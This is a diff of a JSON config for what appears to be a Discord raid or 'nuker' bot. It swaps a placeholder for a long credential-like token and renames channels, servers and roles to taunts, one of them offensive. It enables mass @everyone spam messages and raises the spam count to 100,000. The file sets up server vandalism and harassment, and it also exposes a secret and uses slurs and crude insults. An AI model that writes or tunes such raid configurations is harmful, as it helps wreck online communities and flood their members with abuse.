@@ -1,15 +1,15 @@
 {
-	"Token": "ur token",
-	"Prefix": ">",
+	"Token": "sO2dYuDm59W70esy9_6Hzo4nxu_LMO2_6imZN_8ph7A-1665786139-0-ARFKTzZ7cAGEeRFVXpsMt6m9vjfuaFPRCcZjSd9T0FNGQM7J9NFFJYF4JltvKgnkUxw6CN5YretwL2/EmFNq5+hNe16DjqmtVBH3QDeaOu6E8m1gYNV2riJwI7o5zL0sEg==",
+	"Prefix": "!",
 
-	"Channel-Names": ["lerker was here"], 
-	"Server-Names": ["beamed by lerker"],
-	"Role-Names": ["@lerkerbeamedyou"],
-	"Reason": ["beamed by lerker", "lerker beamed me"],
+	"Channel-Names": ["NotBang"], 
+	"Server-Names": ["NotBang"],
+	"Role-Names": ["@norapist"],
+	"Reason": ["y'all are annoying", "Don't fuck with people in the game"],
 
 	"Spam": true,
 
 	"Webhook-Names": ["@lerkerbeamedyou", "get beamed by lerker retard"],
 	"Spam-Messages": ["@everyone LERKER WIZZED YOU", "@everyone LERKER  FUCKED YOUR SERVER"],
-	"Spam-Amount": 10000
+	"Spam-Amount": 100000
 }
